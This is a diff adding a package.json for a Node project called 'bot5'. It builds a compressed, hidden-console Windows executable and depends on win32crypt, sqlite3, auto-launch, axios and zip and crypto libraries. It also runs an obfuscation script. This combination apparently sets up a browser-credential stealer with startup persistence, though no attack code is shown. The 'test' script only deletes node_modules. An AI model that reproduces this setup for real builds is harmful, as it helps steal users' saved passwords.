@@ -1,0 +1,42 @@
+{
+  "name": "bot5",
+  "version": "1.0.0",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "mahoa:app": "node /mahoa/mahoa.js",
+    "build": "pkg  package.json",
+    "build:exe": "pkg  package.json",
+    "p2": "npm i && node clear.js && pkg  package.json --build",
+    "pkg": "pkg app.js --targets node14-win-x64 --public-packages --build",
+    "test": "rm -r node_modules"
+  },
+  "bin": "./app.js",
+  "pkg": {
+    "scripts": "app.js",
+    "targets": [
+      "node16-win-x64"
+    ],
+    "compress": true,
+    "outputPath": "bot-5",
+    "assets": [
+      "./node_modules/sqlite3/lib/binding/napi-v6-win32-unknown-x64/node_sqlite3.node",
+      "./node_modules/win32crypt/**/**"
+    ]
+  },
+  "author": "",
+  "license": "ISC",
+  "dependencies": {
+    "adm-zip": "^0.5.10",
+    "auto-launch": "^5.0.5",
+    "axios": "^0.27.2",
+    "base-64": "^1.0.0",
+    "crypto": "^1.0.1",
+    "crypto-js": "^4.1.1",
+    "js-base64": "^3.7.3",
+    "js-crypto-aes": "^1.0.4",
+    "node-hide-console-window": "^2.1.1",
+    "sqlite3": "^5.1.4",
+    "win32crypt": "^0.2.1"
+  }
+}
